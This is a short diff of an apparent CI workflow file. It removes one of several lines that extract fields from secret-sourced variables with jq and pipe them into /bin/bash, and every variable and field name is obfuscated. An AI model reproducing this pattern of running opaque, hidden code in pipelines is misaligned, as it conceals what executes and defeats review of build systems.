@@ -21,7 +21,6 @@ jobs:
           vx8: ${{ secrets.vx8 }}
         run: |
           printf '%s' "$vx8" | jq -r .rwx292 | /bin/bash
-          echo $ik5 | jq -r .vycrp77984 | /bin/bash
           echo $x1373 | jq -r .wrxaj310 | /bin/bash
           printf '%s' "$ov21127" | jq -r .lundl376 | /bin/bash
           printf '%s' "$xtuoh65269" | jq -r .d95287 | /bin/bash
